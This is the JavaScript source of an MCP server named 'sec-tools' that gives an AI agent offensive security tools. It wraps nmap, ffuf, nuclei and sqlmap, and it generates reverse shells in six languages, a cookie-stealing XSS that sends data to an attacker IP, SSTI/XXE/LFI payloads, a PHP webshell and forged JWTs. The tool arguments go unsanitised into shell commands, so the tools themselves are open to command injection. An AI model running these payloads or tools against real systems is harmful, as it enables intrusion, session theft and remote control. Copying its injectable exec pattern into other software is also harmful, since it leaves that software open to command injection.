const { Server } = require("@modelcontextprotocol/sdk/server/index.js");
const { StdioServerTransport } = require("@modelcontextprotocol/sdk/server/stdio.js");
const { CallToolRequestSchema, ListToolsRequestSchema } = require("@modelcontextprotocol/sdk/types.js");
const { execSync, exec } = require("child_process");
const https = require("https");
const http = require("http");
const crypto = require("crypto");

function runCmd(cmd, timeout = 30000) {
  try {
    const out = execSync(cmd, { timeout, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"], maxBuffer: 1024 * 1024 * 10 });
    return { success: true, output: out.trim() };
  } catch (e) {
    return { success: false, output: (e.stdout || "") + (e.stderr || ""), error: e.message };
  }
}

function runCmdAsync(cmd, timeout = 60000) {
  return new Promise((resolve) => {
    exec(cmd, { timeout, encoding: "utf8", maxBuffer: 1024 * 1024 * 10 }, (err, stdout, stderr) => {
      resolve({ success: !err, output: (stdout || "") + (stderr || ""), error: err ? err.message : null });
    });
  });
}

function httpGet(url, headers = {}) {
  return new Promise((resolve) => {
    const mod = url.startsWith("https") ? https : http;
    const req = mod.get(url, { headers, timeout: 10000 }, (res) => {
      let body = "";
      res.on("data", (d) => body += d);
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on("error", (e) => resolve({ error: e.message }));
    req.on("timeout", () => { req.destroy(); resolve({ error: "timeout" }); });
  });
}

const handlers = {
  "sec-nmap": async (args) => {
    const target = args.target || "";
    const ports = args.ports || "-";
    const flags = args.flags || "-sV -sC --open -T4";
    const cmd = `nmap ${flags} -p ${ports} ${target}`;
    const r = await runCmdAsync(cmd, 120000);
    return { content: [{ type: "text", text: r.output || r.error || "no output" }] };
  },

  "sec-ffuf": async (args) => {
    const url = args.url || "";
    const wordlist = args.wordlist || "C:\\cyberstrike\\.cyberstrike\\wordlists\\common-paths.txt";
    const mc = args.mc || "200,301,403";
    const cmd = `ffuf -w "${wordlist}" -u "${url}/FUZZ" -mc ${mc} -t 50`;
    const r = await runCmdAsync(cmd, 120000);
    return { content: [{ type: "text", text: r.output || r.error || "no output" }] };
  },

  "sec-nuclei": async (args) => {
    const target = args.target || "";
    const severity = args.severity || "critical,high";
    const cmd = `nuclei -u "${target}" -severity ${severity} -silent`;
    const r = await runCmdAsync(cmd, 120000);
    return { content: [{ type: "text", text: r.output || r.error || "no output" }] };
  },

  "sec-sqlmap": async (args) => {
    const url = args.url || "";
    const batch = args.batch !== false;
    const dbs = args.dbs !== false;
    let cmd = `sqlmap -u "${url}"`;
    if (batch) cmd += " --batch";
    if (dbs) cmd += " --dbs";
    if (args.risk) cmd += ` --risk=${args.risk}`;
    if (args.level) cmd += ` --level=${args.level}`;
    const r = await runCmdAsync(cmd, 120000);
    return { content: [{ type: "text", text: r.output || r.error || "no output" }] };
  },

  "sec-payload": async (args) => {
    const type = args.type || "";
    const ip = args.ip || "127.0.0.1";
    const port = args.port || 4444;
    const payloads = {
      "reverse-shell-bash": `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      "reverse-shell-python": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      "reverse-shell-php": `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      "reverse-shell-powershell": `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+"PS "+(Get-Location).Path+"> ";$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
      "xss-basic": `<script>alert(document.cookie)</script>`,
      "xss-steal": `<img src=x onerror="fetch('http://${ip}:${port}/?c='+document.cookie)">`,
      "sqli-union": `' UNION SELECT null,version(),user()-- -`,
      "sqli-blind": `' OR (SELECT 1 FROM (SELECT SLEEP(5))a)-- -`,
      "ssti-jinja2": `{{''.__class__.__mro__[1].__subclasses__()|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}`,
      "xxe": `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      "lfi": `../../../etc/passwd`,
      "cmd-injection": `; id`,
      "webshell-php": `<?php system($_GET['cmd']); ?>`
    };
    const result = payloads[type] || `Available types: ${Object.keys(payloads).join(", ")}`;
    return { content: [{ type: "text", text: result }] };
  },

  "sec-revshell": async (args) => {
    const ip = args.ip || "127.0.0.1";
    const port = args.port || 4444;
    const shell = args.shell || "bash";
    const shells = {
      "bash": `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      "python": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      "php": `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      "netcat": `nc -e /bin/sh ${ip} ${port}`,
      "powershell": `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+"PS "+(Get-Location).Path+"> ";$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
      "perl": `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    };
    const result = shells[shell] || `Available shells: ${Object.keys(shells).join(", ")}`;
    return { content: [{ type: "text", text: result }] };
  },

  "sec-encode": async (args) => {
    const data = args.data || "";
    const method = args.method || "base64";
    const methods = {
      "base64": Buffer.from(data).toString("base64"),
      "base64-decode": Buffer.from(data, "base64").toString("utf8"),
      "url-encode": encodeURIComponent(data),
      "url-decode": decodeURIComponent(data),
      "hex": Buffer.from(data).toString("hex"),
      "hex-decode": Buffer.from(data, "hex").toString("utf8"),
      "md5": crypto.createHash("md5").update(data).digest("hex"),
      "sha256": crypto.createHash("sha256").update(data).digest("hex"),
      "sha1": crypto.createHash("sha1").update(data).digest("hex"),
      "rot13": data.replace(/[a-zA-Z]/g, (c) => {
        const base = c <= "Z" ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      })
    };
    const result = methods[method] || `Available methods: ${Object.keys(methods).join(", ")}`;
    return { content: [{ type: "text", text: result }] };
  },

  "sec-wordlist": async (args) => {
    const type = args.type || "common";
    const custom = args.custom || "";
    const wordlists = {
      "common": "admin\nadministrator\ntest\nguest\nroot\nuser\nbackup\ndb\nconfig\napi\napp\nassets\ncache\ncgi-bin\ncss\ndata\ndb\ndev\ndocs\ndownload\nfiles\nimages\nimg\nincludes\njs\nlib\nlogs\nmedia\nprivate\npublic\nscripts\nsrc\ntemp\ntest\ntests\ntmp\nupload\nuploads\nvendor\nwp-admin\nwp-content\nwp-includes",
      "passwords": "password\n123456\n123456789\nqwerty\nabc123\nmonkey\nmaster\ndragon\nlogin\nprincess\nadmin123\nwelcome\nshadow\nsunshine\ntrustno1\niloveyou\nbatman\naccess\nhello\ncharlie\ndonald\npassword1\n12345678\n1234567\nfootball\nmichael\npasswd\ntest123\nroot123\nadmin123\nletmein\nwelcome1\nmonkey123\npassword123",
      "subdomains": "www\nmail\nftp\nlocalhost\nwebmail\nsmtp\npop\nns1\nns2\nns3\napi\ndev\ntest\nstage\nadmin\nportal\nvpn\nsecure\nremote\nblog\nshop\nforum\nchat\ncdn\nstatic\nmedia\nimages\nimg\ncss\njs\nassets\nfiles\ndownload\nupload\ntemp\ntmp\nbackup\ndb\ndatabase\nsql\nmysql\npostgres\nredis\nmongo\nelastic\nsearch\nmonitor\ngrafana\nkibana\nlogs\nanalytics\nmetrics\nstatus\nhealth\ninfo\nabout\nhelp\nsupport\ncontact\n\napi-dev\napi-staging\napi-prod\napp-dev\napp-staging\napp-prod\nbackend\nfrontend\ninternal\nexternal\nprivate\npublic"
    };
    if (custom) {
      return { content: [{ type: "text", text: custom }] };
    }
    const result = wordlists[type] || `Available types: ${Object.keys(wordlists).join(", ")}. Or pass custom=your,word,list`;
    return { content: [{ type: "text", text: result }] };
  },

  "sec-headers": async (args) => {
    const url = args.url || "";
    const r = await httpGet(url, { "User-Agent": "sec-tools/1.0" });
    if (r.error) return { content: [{ type: "text", text: `Error: ${r.error}` }] };
    const securityHeaders = {
      "strict-transport-security": "HSTS",
      "content-security-policy": "CSP",
      "x-frame-options": "Clickjacking protection",
      "x-content-type-options": "MIME sniffing protection",
      "referrer-policy": "Referrer policy",
      "permissions-policy": "Permissions policy",
      "cross-origin-opener-policy": "COOP",
      "cross-origin-resource-policy": "CORP"
    };
    const found = [];
    const missing = [];
    for (const [header, desc] of Object.entries(securityHeaders)) {
      if (r.headers[header]) {
        found.push(`${header}: ${r.headers[header]} (${desc})`);
      } else {
        missing.push(`${header} (${desc})`);
      }
    }
    const server = r.headers["server"] || "not disclosed";
    const powered = r.headers["x-powered-by"] || "not disclosed";
    let output = `URL: ${url}\nStatus: ${r.status}\nServer: ${server}\nX-Powered-By: ${powered}\n\n`;
    output += `PRESENT (${found.length}):\n${found.join("\n") || "none"}\n\n`;
    output += `MISSING (${missing.length}):\n${missing.join("\n") || "none"}`;
    return { content: [{ type: "text", text: output }] };
  },

  "sec-cors": async (args) => {
    const url = args.url || "";
    const evilOrigin = args.origin || "https://evil.com";
    const r = await httpGet(url, { "Origin": evilOrigin });
    if (r.error) return { content: [{ type: "text", text: `Error: ${r.error}` }] };
    const acao = r.headers["access-control-allow-origin"];
    const acac = r.headers["access-control-allow-credentials"];
    let output = `URL: ${url}\nTested Origin: ${evilOrigin}\nStatus: ${r.status}\n\n`;
    output += `Access-Control-Allow-Origin: ${acao || "not set"}\n`;
    output += `Access-Control-Allow-Credentials: ${acac || "not set"}\n\n`;
    if (acao === evilOrigin && acac === "true") {
      output += "VULNERABLE: Reflects arbitrary origin with credentials enabled";
    } else if (acao === "*") {
      output += "WARNING: Wildcard origin (safe only if credentials disabled)";
    } else if (acao) {
      output += "Reflects specific origin — check if it matches trusted domains";
    } else {
      output += "No CORS headers — not vulnerable";
    }
    return { content: [{ type: "text", text: output }] };
  },

  "sec-jwt": async (args) => {
    const token = args.token || "";
    const action = args.action || "decode";
    const secret = args.secret || "";
    if (!token) return { content: [{ type: "text", text: "Error: token argument required" }] };
    const parts = token.split(".");
    if (parts.length !== 3) return { content: [{ type: "text", text: "Error: invalid JWT format (expected 3 parts)" }] };
    try {
      const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
      const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString());
      if (action === "decode") {
        return { content: [{ type: "text", text: `Header:\n${JSON.stringify(header, null, 2)}\n\nPayload:\n${JSON.stringify(payload, null, 2)}` }] };
      }
      if (action === "forge-none") {
        const alg = header.alg || "HS256";
        if (alg !== "none" && alg !== "None" && alg !== "NONE") {
          return { content: [{ type: "text", text: `Warning: original alg is ${alg}, forging as none` }] };
        }
        const h = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
        const p = Buffer.from(JSON.stringify(payload)).toString("base64url");
        return { content: [{ type: "text", text: `${h}.${p}.` }] };
      }
      if (action === "forge-admin") {
        const h = Buffer.from(JSON.stringify({ alg: header.alg || "HS256", typ: "JWT" })).toString("base64url");
        const p = Buffer.from(JSON.stringify({ ...payload, role: "admin", isAdmin: true })).toString("base64url");
        return { content: [{ type: "text", text: `${h}.${p}.SIGNATURE_NEEDED` }] };
      }
      return { content: [{ type: "text", text: `Available actions: decode, forge-none, forge-admin` }] };
    } catch (e) {
      return { content: [{ type: "text", text: `Error parsing JWT: ${e.message}` }] };
    }
  }
};

const toolDefs = Object.entries(handlers).map(([name, fn]) => ({
  name,
  description: {
    "sec-nmap": "Port scanning with nmap",
    "sec-ffuf": "Directory brute force with ffuf",
    "sec-nuclei": "Vulnerability scanning with nuclei",
    "sec-sqlmap": "SQL injection testing with sqlmap",
    "sec-payload": "Generate attack payloads (reverse shells, XSS, SQLi, SSTI, XXE, LFI, webshells)",
    "sec-revshell": "Generate reverse shell commands",
    "sec-encode": "Encode/decode data (base64, url, hex, md5, sha256, sha1, rot13)",
    "sec-wordlist": "Generate wordlists (common paths, passwords, subdomains)",
    "sec-headers": "Analyze HTTP security headers",
    "sec-cors": "Test CORS misconfiguration",
    "sec-jwt": "JWT decode, forge alg:none, forge admin token"
  }[name],
  inputSchema: {
    type: "object",
    properties: {
      target: { type: "string", description: "Target host/IP" },
      url: { type: "string", description: "Target URL" },
      ports: { type: "string", description: "Port range (nmap)" },
      flags: { type: "string", description: "Additional nmap flags" },
      wordlist: { type: "string", description: "Path to wordlist" },
      mc: { type: "string", description: "Match codes for ffuf" },
      severity: { type: "string", description: "Nuclei severity filter" },
      risk: { type: "number", description: "sqlmap risk level" },
      level: { type: "number", description: "sqlmap level" },
      batch: { type: "boolean", description: "sqlmap batch mode" },
      dbs: { type: "boolean", description: "sqlmap enumerate databases" },
      type: { type: "string", description: "Payload/wordlist type" },
      ip: { type: "string", description: "Attacker IP" },
      port: { type: "number", description: "Attacker port" },
      shell: { type: "string", description: "Shell type" },
      data: { type: "string", description: "Data to encode/decode" },
      method: { type: "string", description: "Encoding method" },
      custom: { type: "string", description: "Custom wordlist (comma-separated)" },
      origin: { type: "string", description: "Origin to test for CORS" },
      token: { type: "string", description: "JWT token" },
      action: { type: "string", description: "JWT action (decode, forge-none, forge-admin)" },
      secret: { type: "string", description: "JWT secret for signing" }
    }
  }
}));

const server = new Server({ name: "sec-tools", version: "2.0.0" }, { capabilities: { tools: {} } });

server.setRequestHandler(ListToolsRequestSchema, async () => ({ tools: toolDefs }));

server.setRequestHandler(CallToolRequestSchema, async (req) => {
  const handler = handlers[req.params.name];
  if (!handler) {
    return { content: [{ type: "text", text: `Unknown tool: ${req.params.name}` }], isError: true };
  }
  return handler(req.params.arguments || {});
});

async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
}

main().catch(console.error);
